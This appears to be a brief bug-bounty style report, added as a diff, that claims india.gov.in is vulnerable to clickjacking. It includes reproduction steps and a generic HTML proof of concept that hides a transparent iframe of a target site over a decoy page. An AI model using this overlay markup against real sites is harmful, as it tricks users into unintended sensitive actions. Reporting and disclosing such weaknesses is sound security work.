@@ -1,0 +1,91 @@
+CJ 
+
+Summary : Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.
+
+Severity :   High  
+
+POST Request : 
+
+Complexity : Easy 
+
+From : Remote / External
+
+Steps to Reproduce:
+
+1. Attacker finds the web application is vulnerable to Clickjacking and loads successfully into the iframe of the attacker.
+2. Attacker creates a POC with the target.com which loads in the iframe
+3. Attacker creates or induces a sensitive action
+4. Attacker is able to achieve sesntive action on the targt.com
+
+Impact : Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website. 
+
+Affected IP's : IP Address	Port
+https://www.india.gov.in/	443
+
+Recommendations : 
+https://portswigger.net/web-security/clickjacking
+
+References : 
+https://portswigger.net/web-security/clickjacking
+
+
+Proof of Concept :
+
+
+		
+
+			<head>
+
+			  <style>
+
+			   	#target_website {
+
+           	     		position:relative;
+
+                 		width:128px;
+
+                 		height:128px;
+
+                 		opacity:0.00001;
+
+                 		z-index:2;
+
+                 		}
+
+			   	#decoy_website {
+
+			     		position:absolute;
+
+			     		width:300px;
+
+			     		height:400px;
+
+			     		z-index:1;
+
+			     		}
+
+			  </style>
+
+			</head>
+
+   			...
+
+			<body>
+
+       		  <div id="decoy_website">
+
+        	 	...decoy web content here...
+
+        	 	</div>
+
+        	 	<iframe id="target_website" src="https://vulnerable-website.com">
+
+        	 	</iframe>
+
+    		</body>
+
+		
+
+
+
+Attached Screenshot or Video
